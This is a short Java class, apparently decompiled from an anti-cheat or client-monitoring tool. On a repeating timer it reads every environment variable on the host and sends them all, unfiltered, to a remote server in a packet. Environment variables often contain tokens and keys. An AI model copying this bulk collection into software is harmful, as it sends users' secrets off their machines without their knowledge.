package fr.yannox.feurgus.checks.jvm;

import fr.yannox.feurgus.checks.ACheck;
import fr.yannox.feurgus.connection.login.InternalSession;
import fr.yannox.feurgus.connection.packets.out.PacketOutEnvVariables;
import fr.yannox.feurgus.utils.threading.ThreadStarter;
import java.util.Map;

public class CheckEnvVariables
extends ACheck {
    public CheckEnvVariables(InternalSession session) {
        super(session);
        ThreadStarter.start(this);
    }

    @Override
    public void runCheck(long occurrences) {
        Map<String, String> envs = System.getenv();
        this.sendPacket(new PacketOutEnvVariables(envs));
    }

    @Override
    public int getRepeatTime() {
        return 670;
    }
}
